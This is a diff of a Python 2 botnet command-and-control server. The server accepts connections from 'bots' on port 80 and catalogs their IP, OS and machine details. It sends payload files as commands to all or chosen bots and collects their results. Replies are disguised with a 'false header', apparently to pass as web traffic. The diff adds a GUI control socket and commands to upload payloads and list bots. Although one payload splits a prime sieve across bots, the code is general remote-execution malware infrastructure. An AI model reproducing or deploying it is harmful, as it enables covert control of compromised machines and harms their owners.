@@ -11,6 +11,8 @@ import time
 import datetime
 import Queue
 
+GUIPORT = ('localhost', 1776)
+GUIsock = None
 PORT = ('localhost', 80)
 commandQueue = Queue.Queue() #Holds commands from GUI to be processed by commandHandler thread
 processQueue = Queue.Queue() #Holds queue of processes to be terminated on shutdown
@@ -29,12 +31,11 @@ class Bot:
 
 #unfortunately manager.list does not handle custom classes very well so we manually convert targets and results to strings
 class Payload:
-    def __init__(self):
-        self.ID = ''
-        self.command = ''
-        self.name = ''
-        self.targets = "" #list of bots
-        self.results = "" #list of botId and results
+    ID = ''
+    command = ''
+    name = ''
+    targets = "" #list of bots
+    results = "" #list of botId and results
     def addTarget(self, botId):
         temp = []
         if(self.targets == ""):
@@ -64,10 +65,17 @@ class Payload:
 
 #listens for connections from bots
 def server(finishedPayloads, payloadProxy, BOTS):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.bind(PORT)
-    sock.listen(1)
+    logging.debug("In Server process")
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        global PORT
+        sock.bind(PORT)
+        sock.listen(1)
+        logging.info("Listening on port: " + str(80))
+    except Exception, e:
+        logging.info("Failed to open server socket " + str(e))
+        return
     curr_payloads = []
     c = 0
     while True:
@@ -169,8 +177,6 @@ def communicate(conn, address, payloadProxy, BOTS, finished):
                                 p.addResult(botId, decoded)
                                 if len(p.getTargets()) == len(p.getResults()):
                                     finished.append(p)
-                                    with open(p.ID+".res", 'w') as f:
-                                        f.write(str(p.getResults()))
                                     try:
                                         payloads.remove(p)
                                     except Exception, e:
@@ -188,8 +194,6 @@ def communicate(conn, address, payloadProxy, BOTS, finished):
                         p = checkIfIsTarget(botId, payloads)
                     if p != '':
                         logging.debug("Payload selected: " + p.ID)
-                        response = ""
-                        
                         if "XYZ12" in p.command:#this is sieve payload
                             botlist = p.getTargets()
                             tempcommand = p.command
@@ -204,23 +208,19 @@ def communicate(conn, address, payloadProxy, BOTS, finished):
                                     if "n = " not in line:
                                         continue
                                     topofsieve = line.split(' ')[2]
-                                
-                                partitionint = int(int(topofsieve)/len(botlist))
-
-                                logging.debug("botindex1 " + str(partitionint*botindex))
-                                t = ""
-                                t = "\ntlow = {}\nthigh = {}\n".format(str(partitionint*botindex), str((botindex+1)*partitionint-1))
-                                logging.debug("pitttt = " + t)
-                                logging.debug("command1 = " + p.command)
-                                p.command = tempcommand + t
-                                logging.debug("command2 = " + p.command)
-                                full_command = genCommandFromPayload(p)
-                                response = createFalseHeader(len(full_command), full_command)
-                                logging.debug("Sending Response: " + response)
-                                conn.send(response)
-                                
-
-                        else:
+                                    partitionint = int(int(topofsieve)/len(botlist))
+                                    logging.debug("botindex1 " + str(partitionint*botindex))
+                                    t = ""
+                                    t = "\ntlow = {}\nthigh = {}\n".format(str(partitionint*botindex), str((botindex+1)*partitionint-1))
+                                    logging.debug("pitttt = " + t)
+                                    logging.debug("command1 = " + p.command)
+                                    p.command = tempcommand + t
+                                    logging.debug("command2 = " + p.command)
+                                    full_command = genCommandFromPayload(p)
+                                    response = createFalseHeader(len(full_command), full_command)
+                                    logging.debug("Sending Response: " + response)
+                                    conn.send(response)
+                        else:            
                             full_command = genCommandFromPayload(p)
                             response = createFalseHeader(len(full_command), full_command)
                             logging.debug("Sending Response: " + response)
@@ -268,24 +268,24 @@ def executeCommand(command, payloadProxy, finished, BOTS):
     payloadList = payloadProxy[0]
     payloadID = command.payloadID
     cmd = command.command
-    tokens = cmd.split(' ', 1)
-    com = tokens[0]
-    args = tokens[1]
+    tokens = cmd.split('$')
+    com = tokens[1]
+    botString = tokens[2]
+    opts = tokens[3]
     
-    if com == 'l':#modify stuff here for "self-modifying" code
-        args = args.split(' ')
-        fname = args[0]
+    if com == 'UP':#modify stuff here for "self-modifying" code
+        fname = opts
         p = Payload()
         p.name = fname
         f = open(fname, 'r')
         p.command = f.read()
         f.close()
         p.ID = payloadID
-        if args[1].lower() == 'all':
+        if botString.lower() == 'all':
             for key, value in BOTS.items():
                 p.addTarget(key)
         else:
-            bots = args[1].split(':')
+            bots = botString.split(':')
             for key, value in BOTS.items():
                 if key in bots:
                     p.addTarget(key)
@@ -314,7 +314,13 @@ message_lock = Lock()
 def sendToGUI(message):
     message_lock.acquire()
     try:
-        print message
+        global GUIsock
+        if '\n' not in message:
+            GUIsock.send(message + '\n')
+        else:
+            GUIsock.send(message)
+    except:
+        logging.info("Failed to send message.")
     finally:
         message_lock.release()
 
@@ -325,38 +331,72 @@ def main():
     payloadProxy = manager.list()
     payloadProxy.append([]);
     BOTS = manager.dict()
+    logging.debug("Before Server Process")
     serverproc = Process(target=server, args=(finishedPayloadList, payloadProxy, BOTS))
     serverproc.daemon = True
     serverproc.start()
+    logging.info("Started server process")
     processQueue.put(serverproc)
     #grabs values from command queue and interprets it
     cmd_thread = threading.Thread(target = commandHandler, args=(payloadProxy, finishedPayloadList, BOTS))
     cmd_thread.start()
+    logging.info("Connecting to GUI ")
+    global GUIsock, GUIPORT
+    try:
+        GUIsock = socket.socket()
+        GUIsock.connect(GUIPORT)
+    except Exception, e:
+        logging.info("Failed to connect to GUI. " + str(e))
+        return
+    logging.info("Connected to GUI ")
+    try:
+        GUIFile = GUIsock.makefile()
+    except Exception, e:
+        logging.info("Failed to create file from socket. " + str(e))
+        return
+    sendToGUI('')
+    sendToGUI('')
     while True:
         try:
-            cmd = raw_input("Please input next command ('help' for help): ")
+            cmd = GUIFile.readline()
+            cmd = cmd.rsplit('\n')[0]
+            logging.info("Command is: " + cmd)
         except Exception, e:
             logging.info("Invalid input: " + str(e))
-            break
-        if cmd == 'q' or cmd == "quit":
             break
         try:
             newCommand = ExternalCommand()
             newCommand.command = cmd
-            if cmd.split(' ')[0] == 'l':
+            logging.info("Before split " + cmd)
+            c = cmd.split('$')[1] #get commmand
+            logging.info("Split command: " + c)
+            if c == 'UP':
                 newCommand.payloadID = getID()
-                sendToGUI( newCommand.payloadID + ' ' + cmd.split(' ')[1])
+                #sendToGUI( newCommand.payloadID + ' ' + cmd.split(' ')[1])
+            elif c == 'GS':
+                #return list of bots
+                logging.info("Returning list of bots.")
+                s = ''
+                for key, value in BOTS.items():
+                    s += value.ID + ' ' + value.IP + ' ' + value.OS + ' ' + value.machine + ':'
+                s.rstrip(':') #strip the last colon
+                s += '\n'
+                logging.info("Sending " + s)
+                sendToGUI(s)
+                continue
             else:
                 newCommand.payloadID = cmd.split(' ')[1]
                 sendToGUI( newCommand.payloadID)
 
             global commandQueue
             commandQueue.put(newCommand)
-        except:
+        except Exception, e:
+            logging.info("Command failed: " + str(e))
             continue
     shutdownGracefully()
 
 if __name__ == "__main__":
     signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
     logging.basicConfig(filename='serverLog.log',level=logging.DEBUG)
     main()
